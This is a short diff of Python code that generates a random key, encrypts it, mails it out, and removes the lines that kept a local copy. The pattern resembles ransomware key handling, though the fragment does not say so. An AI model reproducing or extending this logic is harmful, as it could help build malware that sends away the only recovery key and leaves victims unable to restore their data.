@@ -90,8 +90,6 @@ try:
         key=rand.new().read(16)
         sent_key=enc_key(key)
         mail(sent_key[0])
-        with open("key", "w") as k:
-                k.write("%s"%sent_key)
 except:
         print("Key failure")
         exit(0)
